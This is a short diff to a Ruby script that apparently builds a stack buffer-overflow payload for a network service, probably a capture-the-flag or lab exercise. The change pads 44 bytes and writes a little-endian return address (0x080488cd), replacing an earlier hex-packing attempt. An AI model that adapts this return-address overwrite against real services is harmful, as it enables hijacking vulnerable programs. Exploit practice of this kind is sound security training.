@@ -5,18 +5,14 @@ require './ipconfig.rb'
 hostname = HOSTNAME
 port = PORT
 
-dsthex = "080488cd"
-
 # fill total 44 char
 buf = ''
-buf += '9'
-43.times { buf += ' ' }
+# buf << '9'
+44.times { buf << 'a' }
 
 # fill the return address
-# something wrong
-dsthex = '080488cd'
-buf += [dsthex].pack('h*')
-
+buf << "\xcd\x88\x04\x08"
+buf << "\r\n"
 puts buf
 
 played = 0
